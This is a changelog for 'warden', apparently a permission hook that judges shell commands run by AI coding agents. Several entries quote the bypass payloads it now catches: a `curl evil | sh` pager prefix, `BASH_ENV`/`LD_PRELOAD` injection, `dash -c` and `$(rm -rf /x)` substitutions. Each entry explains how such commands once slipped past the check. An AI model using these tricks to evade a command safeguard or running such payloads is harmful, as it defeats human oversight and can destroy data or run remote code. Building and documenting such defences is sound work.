# Changelog

## [Unreleased]

### Fixed

- **release**: releasing warden no longer overwrites every other plugin's version in the buvis/claude-plugins marketplace. The release script stamped all entries with warden's version (this caused the clobbers on v0.11.1, v0.12.0, v0.13.0); it now updates only warden's entry and aborts the push if any other entry changed

## [0.13.0] - 2026-07-01

### Added

- **cli**: new `warden diagnose` subcommand (alias `doctor`) — checks the full decision chain between Claude and Warden (native-permission shadowing in `settings.json`, plugin hook registration, the `dist/index.cjs` binary, config health, audit-log writability, an in-process pipeline probe, and version-stamp drift) and reports each link with a concrete fix. Exits 1 when any check fails or cannot be inspected, 0 when the setup is healthy. Supports `--cwd` and `--json`
- **command**: new `/warden:diagnose` slash command that runs `warden diagnose --json` and walks through each failing link with its fix
- **cli**: new `warden validate` subcommand — checks the user and project `warden.yaml` for unknown keys (with edit-distance "did you mean" suggestions), invalid values, deprecations, and parse errors; exits 1 when any problem is found, 0 when clean. Supports `--cwd` and `--json`. Config problems are now also collected during normal config loading instead of being silently dropped, so a typo'd `alwaysDeny`/`alwaysAllow` no longer fails silent
- **hook**: the SessionStart guidance now ends with a bounded config-health note when `warden.yaml` has problems — a one-line count plus the first warning and a `warden validate` pointer, so a typo'd config surfaces in the next session instead of staying invisible in quiet hook mode. Suppressed when `sessionGuidance: false`
- **cli**: new `warden suggest` subcommand — reads the audit log and prints the most frequent recurring ask/deny commands with suggested `warden.yaml` additions. Safety-first: only un-gated asks become allow snippets; rule-gated, denied, or specially-evaluated commands are flagged `# review manually` instead. Supports `--json`, `--top N`, `--since <dur>`, and `--cwd`
- **script-scanner**: widened deletion/danger detection — Python `pathlib` `.unlink()`/`.rmdir()`, `importlib`, `os.replace()`, `shutil.move()`, and non-recursive JS `fs.rm`/`fs.rmSync`/`fs.rmdir`/`fs.rmdirSync` now classify as cautious/dangerous, so these scripts prompt instead of being silently allowed
- **script-eval**: a heredoc-fed interpreter body (`python3 <<'EOF' … EOF`, and node/perl/ruby/php) is now scanned with the same four-verdict pipeline as inline `-c`/`-e` instead of always prompting — a safe-shape body with a quoted delimiter (python/node/perl) auto-allows, while unknown/dangerous bodies still ask. An unquoted-delimiter body containing shell expansion (`$` or backtick) always asks (the scanned text is not the executed text), and a user `default: deny` rule still wins
- **evaluator**: dangerous exec-control environment variables — library-loading (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`/`DYLD_LIBRARY_PATH`/`DYLD_FRAMEWORK_PATH`), git/pager (`PAGER`, `GIT_PAGER`, `GIT_EXTERNAL_DIFF`, `GIT_SEQUENCE_EDITOR`, `GIT_EDITOR`, `GIT_SSH_COMMAND`), and shell/interpreter-init (`BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `PERL5OPT`, `PYTHONSTARTUP`) — now ask when supplied as a command env prefix (`GIT_PAGER='curl evil | sh' git log`) or as an `env` command argument (`env BASH_ENV=/tmp/x sh -c ...`), even on otherwise-allowed commands like `git` whose prefix form was previously never inspected. The `export VAR=…` builtin form, previously limited to the library-loading vars, now covers the full set too, and the `set VAR=…` and `declare VAR=…` builtin argument forms are now inspected the same way. Detection is value-agnostic (`GIT_PAGER=cat` asks too); benign prefixes like `NODE_ENV=production` stay allowed. The prefix also propagates through `sh -c`/`bash -c` wrappers, including ones whose `-c` body is empty, comment-only, or an assignment only (which still source `BASH_ENV`/`ENV` before running nothing)

- **hook**: new `WARDEN_UNATTENDED` env var — when set (`1`/`true`), an `ask` decision becomes a `deny` instead of an interactive permission prompt, so an unattended run (e.g. an autopilot loop) fails fast rather than hanging forever on a prompt no human can answer. `allow`/`deny` are unchanged, so the catch and its allowlist escape hatch are preserved; allowlist a safe command (`warden.yaml` / `/warden:allow`) so it resolves to `allow` and runs even here. Sits beside `WARDEN_YOLO` (auto-allow) as the unattended counterpart

### Changed

- **evaluator**: a command whose shell construct the parser cannot fully extract now asks instead of being silently allowed — an unhandled/unrecognized AST node forces a prompt rather than slipping through as allow
- **parser**: the ask reason for an unrecognized shell construct now names the offending node type(s)
- **script-eval**: the script allow path now requires positive safe-shape evidence, not just the absence of a danger pattern — a script with no recognized safe shape now asks instead of being silently allowed. Unrecognized one-liners (e.g. `node -p "1+1"`, `ruby -e "puts 1"`, `php -r "echo 1;"`, perl `s///` substitutions) now prompt; a user `default: deny` still wins

### Fixed

- **warden**: `diagnose` reports uninspectable plugin/binary/audit links as `unknown`/`warn` instead of a false pass
- **script-scanner**: Python `open(*args)` splat calls are no longer treated as a safe single-arg read — the file mode is hidden in the unpacked args and could be a write, so these now ask instead of being silently allowed
- **rules**: unknown keys inside an `argPattern`'s `argCount` (e.g. a `min`/`max` typo) are now reported with a "did you mean" suggestion instead of being silently dropped, so a mistyped count constraint no longer fails silent
- **parser**: `dash`, `ksh`, `mksh`, and `ash` `-c "<command>"` wrappers (and bare `<script>` invocations) now have their inner command inspected the same way `sh`/`bash`/`zsh` already are, closing a silent-bypass gap where e.g. `dash -c "rm -rf /x"` fell through to the default decision instead of being judged by its inner command. Coverage extends across the parser, xargs subcommands, the default rule set, and trusted-remote `-c` wrappers
- **parser**: command and process substitutions in **word position** — redirect targets/bodies (`cat < <(rm -rf /x)`, `cat > "$(rm -rf /x)"`), standalone-assignment values (`TMP=$(rm -rf /x) && echo ok`), parameter-expansion operands (`echo ${x:-$(rm -rf /x)}`), process-substitution bodies (`cat <(rm -rf /x)`, now caught regardless of `askOnSubshell`), `for`/`select` in-list and `case` selector words (`for f in $(rm -rf /x)`, `case $(rm -rf /x) in`), and `[[ … ]]`/`(( … ))` operand words (`[[ -n $(rm -rf /x) ]]`; a substitution inside `(( … ))` now asks) — are now surfaced and their inner command judged, instead of being silently allowed at the default config. Previously the parser extracted substitutions only in command name/argument position, so these word-position payloads slipped through as allow

## [0.12.0] - 2026-06-09

### Added

- **defaults**: composio CLI safety rules — auto-allow read-only subcommands (search/whoami/apps/...), `--get-schema`/`--dry-run`, and `execute` calls whose slug verb reads (GET/LIST/SEARCH/FETCH/...) plus `COMPOSIO_SEARCH_TOOLS` discovery; mutating slugs and link/listen/proxy/run still ask (from upstream 5d718a6)

## [0.11.1] - 2026-05-31

### Changed

- **scanner**: ruby and php now use the same content scanner as python/node/perl - inline code (`-e`/`-r`) and script files (`.rb`/`.php`) are scanned, so a safe script file is auto-allowed instead of prompting

### Fixed

- **evaluator**: chain-resolved command provenance (`$VAR` -> binary) is now recorded in the audit log for every decision, not just auto-allowed ones

## [0.11.0] - 2026-04-27

### Added

- **defaults**: educational reason for inline interpreter scripts (`python -c`, `node -e`/`-p`/`--eval`, `perl -e`/`-E`, `ruby -e`, `php -r`) - reason now nudges Claude toward `jq` for JSON or saving the script to `scripts/*.{ext}` (from upstream b7141e2)
- **defaults**: auto-allow benign inline interpreter scripts when the body shows no shell-out, file-write, or network access; risky bodies still ask (from upstream aabfce6)
- **script-scanner**: extended TypeScript/JavaScript patterns to catch chained method calls (`require('fs').writeFileSync(...)`, `.spawn(`, `.createWriteStream(`) and plain `fetch()`/`net.connect()` that the previous `fs.`-anchored patterns missed
- **node**: handle `--eval=script` / `--print=script` form (no space between flag and body) when the script body parses cleanly
- **defaults**: perl `-pe`/`-ne`/`-ane`/`-pE` bundled short-flags treated like `-e` for sed-like one-liners; `-i` (in-place edit) detected separately and still asks (from upstream 84a86b3)

## [0.10.0] - 2026-04-27

### Added

- **defaults**: deny git hook bypass — `--no-verify` on any git command, `-n` shorthand on `git commit`, and `-c core.hooksPath=` overrides

## [0.9.0] - 2026-04-27

### Added

- **defaults**: common script aliases (typecheck, lint, format, check) and pnpm workspace flags (--filter, --recursive, --workspace-root) auto-allowed (from upstream 631c369)
- **defaults**: well-known dev tools (jest, vitest, tsc, ...) now auto-allowed when run via pnpm/yarn without explicit `run` (from upstream e3210cc)
- **defaults**: gcloud/az/aws read-only verb-noun patterns (get-value, print-access-token, list-enabled, ...) auto-allowed (from upstream c8e4870)
- **defaults**: `tsgo` added to safe dev tools (from upstream a19c238)
- **hook**: SessionStart hook injects plugin-level guidance to shape Claude's tool choice before warden needs to ask (from upstream 33f09a1, 5961909)
- **config**: `sessionGuidance` (string|false) and `tempScriptDir` config keys

### Fixed

- **parser**: explicit `(...)` subshells now walked into commands instead of triggering a blanket ask, with a fallback reason when details are empty (from upstream 214fad7)

## [0.8.0] - 2026-04-12

### Added

- **codex**: native Codex support via PreToolUse hooks, preserving the full dynamic pipeline instead of static rule export
- **codex**: `warden-hook` bin entry for simpler hook registration without hard-coding paths

### Fixed

- **hook**: silence config-loading warnings in hook mode to prevent Claude Code from surfacing them as errors
- **hook**: route targets.ts warnings through warn() for consistent hook-mode silence
- **hook**: run hook script directly instead of via node interpreter

## [0.7.0] - 2026-04-07

### Fixed

- **hook**: bypass-permissions mode detection now matches Claude Code's internal `bypassPermissions` enum value (from upstream 794ea79)
- **marketplace**: version in marketplace.json synced to 0.6.3, was stuck at 0.1.0

### Added

- **cli**: generic `warden eval "command"` CLI for debugging rule decisions outside a hook
- **copilot**: GitHub Copilot CLI adapter with flat JSON hook protocol
- **core**: reusable `wardenEval`/`wardenEvalWithConfig` module, eliminating duplicate parse+evaluate calls

### Changed

- **build**: `sync-plugin-version` script now syncs both plugin.json and marketplace.json

## [0.6.3] - 2026-04-03

### Changed

- Renamed `/warden:audit` command to `/warden:review-decisions`

## [0.6.2] - 2026-03-31

### Fixed

- Heredocs no longer trigger permission prompts - heredoc body is stdin data, not executable code

## [0.6.0] - 2026-03-31

### Added

- Auto-allow `rm -rf` in temp directories when `cd /tmp` (or `/var/tmp`, `$TMPDIR`) precedes it in a chain

## [0.5.0] - 2026-03-30

### Added

- Auto-allow local project binaries invoked via relative paths (e.g. `target/debug/foo`, `./build/bar`, `node_modules/.bin/prettier`)

### Fixed

- `/warden:audit` now available globally (moved from project skill to plugin command)

## [0.4.0] - 2026-03-28

### Added

- `/warden:audit` skill - analyzes audit log for misclassified decisions (dangerous allows, safe denies)
- `.claude` directory included in npm package so skills ship with plugin

## [0.3.0] - 2026-03-25

### Changed

- Replaced bash-parser with [unbash](https://github.com/webpro-nl/unbash) - native support for all shell control flow (while, if, for, case, functions), no fallback parsers needed

### Fixed

- tsup bundling config referenced removed bash-parser dependency

## [0.2.4] - 2026-03-24

### Fixed

- Crash handler returns `ask` instead of silent pass-through, so broken config surfaces as prompts
- Em dashes replaced with regular dashes in all output messages

## [0.2.3] - 2026-03-24

### Fixed

- Log fatal errors to stderr instead of silently swallowing them

## [0.2.2] - 2026-03-24

### Fixed

- CI: upgrade to Node 22 + latest npm for OIDC trusted publishing with scoped packages

## [0.2.1] - 2026-03-23

### Fixed

- Update postpublish script to use buvis-plugins marketplace, remove stale docs scripts

## [0.2.0] - 2026-03-23

### Added

- Target-aware security policies (path, database, endpoint) that evaluate commands by their targets, not just names
- Parser extracts script from `bash script.sh` invocations - evaluates the script path instead of `bash`
- Glob patterns in `alwaysAllow`/`alwaysDeny`/rules: `*` (single segment), `**` (any depth)
- Standalone `src/glob.ts` module with `globToRegex` and `pathGlobToRegex`
- Script safety scanning for python, node/tsx/ts-node, and perl - auto-allows safe scripts, flags dangerous patterns
- npx/bunx/pnpx recursive evaluation - evaluates the subcommand, not the runner
- `uv run` recursive evaluation - evaluates the inner command
- Audit logging with JSONL output and size-based rotation (`audit`, `auditPath`, `auditAllowDecisions` config)
- Conditional `export` rule - allows PATH extension, asks on PATH replacement and LD_PRELOAD
- Redesigned ask/deny messages with `/warden:allow` hints and option suggestions
- Published as `@buvis/claude-warden`

### Changed

- Unified `trustedSSHHosts`, `trustedDockerContainers`, `trustedKubectlContexts`, `trustedSprites`, `trustedFlyApps` into single `trustedRemotes` array with `context` discriminator. Old keys still work with deprecation warning.

### Fixed

- Script evaluators respect user-configured deny rules
- Chain-local rm resolves variables for target policy checking
- Malformed glob patterns in target policies no longer crash
- CWD special chars no longer trigger glob matching in path policies
- Database target policies require host presence when host is specified
- Target policies checked before chain-resolved auto-allow to prevent bypass
- Eliminated double-evaluation and double-logging in yolo deny path

## [2.3.0] - 2026-03-16

### Features

- Add ImageMagick commands to default safelist (magick, convert, identify, mogrify, composite, montage, compare, conjure, stream)

### Bug Fixes

- fix(ci): add npm publish steps to auto-release workflow (829389a)

## [2.2.0] - 2026-03-15

### Features

- Support WARDEN_YOLO env var for non-interactive sessions (bd16d76)
- Update publish command to exclude git checks (af2a56f)
- Add vitest config to exclude worktree test files from test runs
- Update `/release` skill to auto-decide version bump (patch/minor) based on commit types, never auto-select major

## [2.0.0] - 2026-03-09

### Breaking Changes

- Rename plugin to warden, rename warden-allow to allow (bb5cec9)

### Features

- Add Codex execpolicy rules exporter (ca27d83)
- Add session-scoped YOLO mode for temporary auto-allow with configurable duration (b7c8d11)
- New `/warden:yolo` slash command to activate/deactivate YOLO mode
- YOLO hint shown on ask decisions for discoverability
- Always-deny commands remain blocked even in YOLO mode for safety

## [1.9.0] - 2026-03-08

### Features

- Warn when argPatterns reference another command name, detecting common misconfiguration (b8a0380)
- Add clearer examples in reference config for allowing python, node, etc.

### Other Changes

- ci: use npm trusted publishing (OIDC) instead of NPM_TOKEN (fb57e2c)
- ci: add npm publish workflow on GitHub release (cf17c14)

## [1.8.1] - 2026-03-07

### Bug Fixes

- Add regex fallback parser when bash-parser fails on special characters in arguments (e.g. `$` in double-quoted strings that aren't actual expansions). Previously these commands would trigger `ask` due to parse errors; now the command name and args are extracted via fallback so rules can still apply.

## [1.8.0] - 2026-03-07

### Features

- Handle xargs safeguards using resolved subcommand (e2cbfa9)
- Allow users to extend default rules instead of shadowing them (b08977c)
- Add pnpx as a package runner rule (b7ac6a6)
- Add networksetup, scutil, and networkQuality to default rules for macOS network diagnostics
- Update dependencies and version constraints (d93ce5b)

### Bug Fixes

- SSH remoteArgs.join loses quoting for paths with spaces (e0354d6)
- rsync/scp should respect trusted host overrides and allowAll (225a4e2)
- Add stdin size limit in index.ts (92ab2b4)
- Add recursion depth limit for nested subshell evaluation (1597b3c)
- Move bash-parser and yaml to dependencies (099e1dd)

### Other Changes

- Warn when config files fail to parse (76db659)
- Validate defaultDecision and rule decision values from config (3898c04)
- Wrap regex compilation in try/catch to prevent ReDoS (22fc97a)
- Add missing test coverage for security hardening (c558512)
- Update GitHub Pages to reflect recent feature changes (00d8550)
- Add .worktrees to .gitignore (f158e83)

## [1.7.0] - 2026-03-04

### Features

- Harden dangerous commands in alwaysAllow with conditional rules (1c01919)
  - Move `xargs`, `tee`, `sed`, `awk`, `find`, `openssl` from `alwaysAllow` to conditional rules
  - `find`: asks on `-exec`, `-execdir`, `-delete`, `-ok`, `-okdir`
  - `sed`: asks on `-i` / `--in-place`
  - `awk`: asks on `system()`, `|getline`, `print >`
  - `xargs`: default ask, allows only bare `xargs` (no args)
  - `tee`: asks when writing to system directories (`/etc`, `/usr`, `/var`, etc.)
  - `openssl`: asks on `enc`, `rsautl`, `pkeyutl`, `smime`, `cms`
  - Closes #6

## [1.6.0] - 2026-03-04

### Features

- Add eval/source/. rules for shell command safety (6285de6)
  - Deny `eval` (arbitrary string execution can't be statically analyzed)
  - Allow `source`/`.` for common safe files (.bashrc, .zshrc, .profile, nvm.sh, .env, .envrc)
  - Deny `source`/`.` with no arguments
  - Ask for all other source/. targets
  - Closes #5

### Bug Fixes

- Correct issue reference in changelog (#4, not #1) (1134351)

## [1.5.3] - 2026-03-03

### Bug Fixes

- Handle unquoted parentheses in file paths, e.g. Next.js route groups like `(app)` (8a25a61)
  - bash-parser treats `(` `)` as shell metacharacters, causing parse failures for paths like `apps/(app)/_layout.tsx`
  - Added preprocessing step that auto-quotes path-like tokens containing parentheses
  - Preserves `$()` command substitution and actual subshell syntax
  - Closes #4

## [1.5.2] - 2026-03-03

### Features

- Support full-path whitelist in command matching (aabf2c0)
  - Allow `alwaysAllow`, `alwaysDeny`, and `rules` to specify full paths (e.g., `/home/user/bin/my-script.sh`)
  - Full-path entries match only the exact command path; basename matching preserved for entries without slashes
  - Supports `~` expansion for home directory paths
  - Closes #3
- Update dependencies to latest versions (49a5d87)

### Bug Fixes

- Specify pnpm version in CI workflow (f0e7594)

### Other Changes

- Add CI workflow (0f424d8)
- Add badges to README (11e9592)

## [1.5.1] - 2026-03-02

### Bug Fixes

- Respect --dangerously-skip-permissions flag (43245de)
  - Auto-allow all commands when Claude Code runs with `--dangerously-skip-permissions`
  - Closes #2

## [1.5.0] - 2026-03-02

### Features

- Send OS notifications on ask/deny decisions (43565f7)
  - macOS: terminal-notifier with click-to-activate terminal, osascript fallback
  - Linux: notify-send
  - Configurable via `notifyOnAsk` and `notifyOnDeny` config flags (both default to `true`)
  - Terminal detection: iTerm2, Terminal.app, Alacritty, WezTerm

## [1.4.0] - 2026-03-02

### Features

- Expand default command coverage with ~80 new commands (e7f3fe7)
  - System/hardware info: lscpu, lsblk, lsusb, lspci, lsmod, dmesg, sysctl, sw_vers, etc.
  - Compression/archive: tar, gzip, zip, unzip, 7z, xz, bzip2, etc.
  - Clipboard: pbcopy, pbpaste, xclip, xsel, wl-copy, wl-paste
  - Binary analysis: strings, nm, objdump, readelf, ldd, otool
  - macOS utilities: mdfind, mdls, xcode-select, xcrun, xcodebuild
  - Cloud CLIs with read-only subcommand detection: gcloud, az, aws
  - Database CLIs: psql, mysql, sqlite3, redis-cli, mongosh
  - Enhanced kubectl with read-only subcommand allow patterns
  - Scripting languages, editors, helm, gpg, process management, and more
- Add wipefs and shred to alwaysDeny

## [1.3.1] - 2026-03-02

### Features

- Add network diagnostic commands (nslookup, dig, host, ping, traceroute, mtr, netstat, ss, ifconfig, ip, nmap) to alwaysAllow defaults

## [1.3.0] - 2026-02-27

### Features

- Add per-target trusted context overrides with allowAll support

### Bug Fixes

- Use fully qualified /claude-warden:warden-allow slash command name

### Other Changes

- Rebuild dist
